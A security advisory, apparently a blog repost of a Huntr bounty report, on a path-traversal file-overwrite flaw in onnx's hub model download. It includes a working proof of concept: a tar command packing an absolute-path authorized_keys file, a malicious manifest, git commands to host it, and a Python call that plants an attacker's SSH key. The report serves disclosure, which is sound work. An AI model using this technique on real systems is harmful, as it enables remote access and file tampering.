---
layout: post
title:  "Huntr: Arbitrary File Overwrite in onnx"
date:  2024-04-07 10:31:06 +0800
categories: file-overwrite
---

## Name

> Huntr: Arbitrary File Overwrite in onnx

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Description

The [download_model_with_test_data](https://onnx.ai/onnx/api/hub.html#download-model-with-test-data) function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly leads to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.

The vulnerable function is exposed through the `download_model_with_test_data` function, which is further used in the onnx framework, as well as can be imported easily.

This code snippet shows how the `download_model_with_test_data` function extracts a tar file downloaded from internet without performing any security checks.

```
def download_model_with_test_data(
    model: str,
    repo: str = "onnx/models:main", # change to attacker's repo
    opset: Optional[int] = None,
    force_reload: bool = False,
    silent: bool = False, # set silent to True
) -> Optional[str]:
    selected_model = get_model_info(model, repo, opset)

    local_model_with_data_path_arr = selected_model.metadata[
        "model_with_data_path"
    ].split("/")

    model_with_data_sha = selected_model.metadata["model_with_data_sha"]
    ...
    local_model_with_data_path = join(
        _ONNX_HUB_DIR, os.sep.join(local_model_with_data_path_arr)
    )

    if force_reload or not os.path.exists(local_model_with_data_path):
        os.makedirs(os.path.dirname(local_model_with_data_path), exist_ok=True)
        lfs_url = _get_base_url(repo, True)
        print(f"Downloading {model} to local path {local_model_with_data_path}")
        _download_file( # download model from github repository
            lfs_url + selected_model.metadata["model_with_data_path"],
            local_model_with_data_path,
        )
    else:
        print(f"Using cached {model} model from {local_model_with_data_path}")

    with open(local_model_with_data_path, "rb") as f:
        model_with_data_bytes = f.read()

    with tarfile.open(local_model_with_data_path) as model_with_data_zipped:
        # FIXME: Avoid index manipulation with magic numbers
        local_model_with_data_dir_path = local_model_with_data_path[
            0 : len(local_model_with_data_path) - 7
        ]
        model_with_data_zipped.extractall(local_model_with_data_dir_path) # just extract without any security checks

    return model_with_data_path
```

The Python documentation explains us that tarfiles may also have absolute filenames starting with / which could overwite files in system.

```
Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
```

## Proof of Concept

An attacker can create a malicous tar file using following command:

```
tar --absolute-names -cvf hack.tar.gz /home/kali/.ssh/authorized_keys
```

Then, the attacker will upload the `hack.tar.gz` as onnx model to his own github repository. Besides, create file `ONNX_HUB_MANIFEST.json` with tar file path(`model_with_data_path`) and sha256 value(`model_with_data_sha`).

Create malicious model repo:

```
git lfs track "*.gz"
git add .
git commit -m 'add gz lfs models'
git push
```

the `ONNX_HUB_MANIFEST.json` metadata file example:

```
[
    {
        "model": "MNIST",
        "model_path": "validated/mnist-8.onnx",
        "onnx_version": "1.3",
        "opset_version": 8,
        "metadata": {
            "model_sha": "",
            "model_bytes": 26454,
            "tags": [
                "vision",
                "classification",
                "mnist"
            ],
            "io_ports": {
                "inputs": [
                    {
                        "name": "Input3",
                        "shape": [
                            1,
                            1,
                            28,
                            28
                        ],
                        "type": "tensor(float)"
                    }
                ],
                "outputs": [
                    {
                        "name": "Plus214_Output_0",
                        "shape": [
                            1,
                            10
                        ],
                        "type": "tensor(float)"
                    }
                ]
            },
            "model_with_data_path": "validated/hack.tar.gz",
            "model_with_data_sha": "786bb632aab30bb574f7f2bab991c56c7707f8d224845f85a16bce32e7980cac",
            "model_with_data_bytes": 26751
        }
    }
]
```
I have create one malicous repo for testing: [https://github.com/sunriseXu/onnx](https://github.com/sunriseXu/onnx)

If anyone now downloads model from online github repository, and `download_model_with_test_data` will extract the malicous tar file and overwrite files specified in tarfile by absolute path silently.

```
from onnx import ModelProto, hub
hub.download_model_with_test_data("mnist",repo="sunriseXu/onnx",force_reload=True,silent=True)
```

```
$ cat /home/kali/.ssh/authorized_keys
ssh-rsa xxx hacker@test.com
```

tested in google colab: [https://colab.research.google.com/drive/1m1iJcfp-dETTr013HyYaYJsdetBa-7YA?usp=sharing](https://colab.research.google.com/drive/1m1iJcfp-dETTr013HyYaYJsdetBa-7YA?usp=sharing)

![poc1](https://raw.githubusercontent.com/sunriseXu/onnx/main/img/poc.png)

![poc2](https://raw.githubusercontent.com/sunriseXu/onnx/main/img/poc2.png)

## Impact

This vulnerability can have severe consequences. This section will highlight some tangible impact.

SSH Access
On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.

Web Servers
On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)


## Reference

[https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89](https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89)

## Occurrences

[https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369](https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369)
